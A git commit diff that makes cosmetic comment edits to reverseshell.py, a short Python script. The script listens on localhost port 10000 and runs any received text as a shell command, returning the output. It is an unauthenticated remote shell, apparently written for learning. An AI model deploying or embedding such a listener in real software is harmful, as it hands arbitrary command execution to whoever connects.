113c8191d560c5a13000d8978b959ba4d174b6f2
Anthony Rose <77029994+Anthony-Rose@users.noreply.github.com>
2023-01-08 08:20:54 -0800

    Update reverseshell.py

--- reverseshell.py
+++ reverseshell.py
@@ -1,17 +1,18 @@
 import socket
 import subprocess
-# Create a TCP/IP socket
+#Create a TCP/IP socket
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-# create socket by binding locahost & port
+# define socket
 server_address = ('localhost', 10000)
 sock.bind(server_address)
 
-# Listen for incoming connections
+# listen for incoming connections
 sock.listen(1)
 
 while True:
-    # Wait for the client to connect
+    # loop until forced break
+    # wait for the client to connect
     print('waiting for a connection')
     connection, client_address = sock.accept()
     try:
@@ -25,8 +26,8 @@ while True:
                 output = subprocess.run(data, shell=True, stdout=subprocess.PIPE)
                 connection.sendall(output.stdout)
             else:
-                print('no more data from', client_address)
+                print('no more data from ', client_address)
                 break
     finally:
-        # Clean up the connection
+        # close the connection
         connection.close()
